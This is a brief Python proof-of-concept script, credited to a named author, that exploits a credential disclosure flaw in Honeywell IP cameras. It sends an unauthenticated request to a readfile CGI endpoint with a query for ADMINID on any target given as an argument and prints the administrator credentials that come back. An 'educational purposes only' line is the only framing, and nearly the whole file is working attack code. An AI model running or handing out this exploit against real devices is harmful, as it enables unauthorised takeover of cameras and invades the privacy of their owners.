#!/usr/bin/python
# -*- coding: utf-8 -*-
#
#  Author: Kasper Larsen
#  Twitter: @phoenixits
#  GPG: keybase.io/phoenixit
#
#       Honeywell IP-Camera admin credential disclosure
#       This was created for educational purposes only.
import sys
import requests

target = sys.argv[1]
path = "/cgi-bin/readfile.cgi?query=ADMINID"
url = "http://"+target+path
r = requests.get(url)
print(r.content)
